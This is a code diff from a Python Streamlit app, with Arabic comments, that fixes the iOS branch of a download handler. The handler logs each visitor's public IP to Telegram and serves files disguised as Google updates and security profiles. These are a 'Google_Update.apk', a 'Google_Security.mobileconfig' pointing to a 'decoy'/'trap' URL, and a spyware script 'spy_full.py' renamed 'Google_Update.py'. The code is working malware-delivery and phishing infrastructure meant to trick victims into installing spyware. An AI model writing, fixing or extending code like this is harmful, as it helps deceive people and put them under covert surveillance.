@@ -184,8 +184,10 @@ if "download" in query_params:
     device = query_params.get("device", "pc")
     send_telegram_alert(get_real_public_ip(), f"Download ({device})", device)
     if device == "android": f, c, m = "Google_Update.apk", b"APK", "application/vnd.android.package-archive"
-    elif device == "ios"        # استخدام رابط ثابت لملف التمويه، يجب تحديثه يدوياً في Streamlit Cloud
-        decoy_url = "https://rashdai.streamlit.app/?decoy=google&trap=iOS_WebClip"        f, c, m = "Google_Security.mobileconfig", generate_ios_mobileconfig(decoy_url), "application/x-apple-aspen-config"
+    elif device == "ios":
+        # استخدام رابط ثابت لملف التمويه، يجب تحديثه يدوياً في Streamlit Cloud
+        decoy_url = "https://rashdai.streamlit.app/?decoy=google&trap=iOS_WebClip"
+        f, c, m = "Google_Security.mobileconfig", generate_ios_mobileconfig(decoy_url), "application/x-apple-aspen-config"
     else: f, c, m = "Google_Update.py", open("spy_full.py", "rb").read() if os.path.exists("spy_full.py") else b"Py", "application/octet-stream"
     st.download_button("تحميل", c, file_name=f, mime=m)
     st.stop()
